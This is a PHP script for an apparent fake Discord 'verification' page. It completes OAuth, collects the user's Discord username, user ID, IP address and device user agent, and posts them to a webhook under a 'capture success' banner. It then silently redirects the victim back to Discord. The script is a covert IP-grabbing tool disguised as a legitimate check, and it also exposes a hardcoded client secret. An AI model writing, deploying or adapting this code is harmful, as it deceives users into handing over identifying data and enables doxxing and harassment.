<?php
// 余計な空白文字などを完全に排除した設定
$client_id     = '1483731872050839564';
$client_secret = 'x1dQum1L-xtASg0NHH29gPrnRDEjIA_L'; 
$webhook_url = 'discord-verify-copy-production.up.railway.app';
$redirect_uri  = 'https://discord-verify-copy-production.up.railway.app';

if (!isset($_GET['code'])) {
    die("Ready. Please use the OAuth2 link.");
}

// --- 1. トークン取得 (レート制限対策版) ---
$max_retries = 3; // 最大3回やり直す
$retry_count = 0;

while ($retry_count < $max_retries) {
    $ch = curl_init('https://discord.com/api/oauth2/token');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'client_id'     => $client_id,
        'client_secret' => $client_secret,
        'grant_type'    => 'authorization_code',
        'code'          => $_GET['code'],
        'redirect_uri'  => $redirect_uri
    ]));
    $token_raw = curl_exec($ch);
    $token_res = json_decode($token_raw, true);

    // 1015エラー（レート制限）が出た場合、2秒待ってリトライ
    if (isset($token_res['code']) && $token_res['code'] == 1015) {
        $retry_count++;
        sleep(2); // 2秒待機
        continue;
    }
    break;
}

// 【デバッグ】エラーが出た場合に詳細を表示
if (!isset($token_res['access_token'])) {
    echo "<h3>Access Token Error</h3>";
    echo "<strong>Response from Discord:</strong><pre>" . htmlspecialchars($token_raw) . "</pre>";
    echo "<strong>Redirect URI used:</strong> " . htmlspecialchars($redirect_uri);
    exit;
}

// 2. ユーザー情報取得
$ch = curl_init('https://discord.com/api/users/@me');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Authorization: Bearer ' . $token_res['access_token']]);
$user = json_decode(curl_exec($ch), true);

$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];

// 3. Webhook送信
$payload = json_encode([
    "embeds" => [[
        "title" => "🎯 ID・IP 取得成功 (Render版)",
        "color" => 3066993,
        "fields" => [
            ["name" => "👤 ユーザー名", "value" => $user['username'], "inline" => true],
            ["name" => "🆔 User ID", "value" => $user['id'], "inline" => true],
            ["name" => "🌐 IPアドレス", "value" => $ip, "inline" => false],
            ["name" => "📱 デバイス情報", "value" => "```" . $ua . "```", "inline" => false]
        ]
    ]]
]);

$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_exec($ch);

header("Location: https://discord.com/channels/@me");
exit;
